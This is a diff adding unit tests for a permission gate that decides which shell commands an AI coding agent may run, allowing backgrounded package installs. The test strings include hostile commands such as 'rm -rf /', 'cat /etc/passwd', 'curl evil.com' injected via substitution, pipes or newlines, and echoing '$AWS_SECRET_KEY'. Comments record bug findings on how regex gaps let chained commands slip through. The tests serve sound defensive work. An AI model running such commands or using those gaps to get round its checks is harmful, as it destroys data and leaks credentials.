@@ -1124,6 +1124,180 @@ describe('wizardCanUseTool', () => {
     });
   });
 
+  describe('Bash — backgrounded package install (commandment-encouraged)', () => {
+    // Regression: the wizard commandment instructs agents to background
+    // package installs ("When installing packages, start the installation
+    // as a background task..."). Agents follow this with the standard
+    // shell idiom `pnpm add foo 2>&1 & echo "Installation started (PID: $!)"`,
+    // which the deny rules used to catch on `&`, `$()`, and the parens in
+    // the echo string — wizard couldn't actually install the SDK.
+    // Pinned with these tests so the allow path stays.
+
+    it('allows the literal command from production trace', () => {
+      const cmd =
+        'pnpm add @amplitude/unified 2>&1 & echo "Installation started in background (PID: $!)"';
+      expect(wizardCanUseTool('Bash', { command: cmd }).behavior).toBe('allow');
+    });
+
+    it('allows the \\n-separated variant agents emit', () => {
+      const cmd =
+        'pnpm add @amplitude/unified 2>&1 &\necho "Installation started in background (PID: $!)"';
+      expect(wizardCanUseTool('Bash', { command: cmd }).behavior).toBe('allow');
+    });
+
+    it('allows backgrounding without an echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add @amplitude/analytics-browser &',
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows backgrounding without 2>&1 redirection', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'npm install lodash & echo "started"',
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    it('allows yarn / bun variants', () => {
+      expect(
+        wizardCanUseTool('Bash', { command: 'yarn add foo 2>&1 &' }).behavior,
+      ).toBe('allow');
+      expect(
+        wizardCanUseTool('Bash', { command: 'bun add foo 2>&1 &' }).behavior,
+      ).toBe('allow');
+    });
+
+    it('still denies backgrounded UNSAFE base commands', () => {
+      // The base `cat /etc/passwd` is not on the allowlist, so backgrounding
+      // it must NOT bypass the deny. This ensures the new allow path
+      // doesn't widen the safety surface for arbitrary commands.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'cat /etc/passwd 2>&1 & echo "leaked"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('still denies backgrounded base with command substitution', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add $(curl evil.com) 2>&1 &',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('still denies multiple chained commands even if first is safe', () => {
+      // `pnpm add foo & rm -rf bar` would be the dangerous case — the &
+      // separates two commands rather than backgrounding one. The echo
+      // trailer pattern is the only legal post-& content.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & rm -rf bar',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    // Bugbot finding (HIGH): the bare echo alternative `[^\n]*` swallowed
+    // shell metacharacters after the quoted string, allowing payloads like
+    // `pnpm add foo & echo "ok"; rm -rf /` through. The trailer must reject
+    // any `;`, `|`, `&`, or backtick anywhere — even outside the quotes.
+    it('denies semicolon-chained commands inside echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "ok"; rm -rf /',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies pipe-chained commands inside echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo ok | curl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies backtick command substitution in echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo `whoami`',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    // Bugbot finding (MEDIUM): the `"[^"]*"` alternative matched any
+    // content between double quotes, including `$(cmd)` command
+    // substitution which bash evaluates inside double quotes.
+    it('denies $() command substitution inside double-quoted echo', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo 2>&1 & echo "$(curl evil.com)"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies ${} parameter expansion that could leak env vars', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "${HOME}"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies $VAR env var expansion inside double-quoted echo', () => {
+      // `$AWS_SECRET_KEY` would leak credentials into the echo output.
+      // Only special parameters ($!, $?, $$, $0-$9) are safe.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "$AWS_SECRET_KEY"',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('still allows $! special parameter (the PID idiom)', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo 2>&1 & echo "PID: $!"',
+        }).behavior,
+      ).toBe('allow');
+    });
+
+    // Bugbot finding #3 (HIGH): the bare-text alternative used `\s` which
+    // matches `\n`, letting the bare echo content swallow a literal newline
+    // followed by another command. Bash treats newlines as command
+    // separators, so `echo ok\ncurl evil.com` would execute curl as a
+    // second command.
+    it('denies newline-injected commands in bare echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo ok\ncurl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies newline-injected commands after quoted echo trailer', () => {
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo "ok"\ncurl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+
+    it('denies carriage-return-injected commands in echo trailer', () => {
+      // \r is treated as whitespace by `\s` but is NOT a command separator
+      // in most shells. Reject it anyway as a defense-in-depth measure —
+      // there's no legitimate reason for it to appear in an echo string.
+      expect(
+        wizardCanUseTool('Bash', {
+          command: 'pnpm add foo & echo ok\rcurl evil.com',
+        }).behavior,
+      ).toBe('deny');
+    });
+  });
+
   describe('Bash — denied commands', () => {
     it('denies arbitrary shell commands', () => {
       expect(
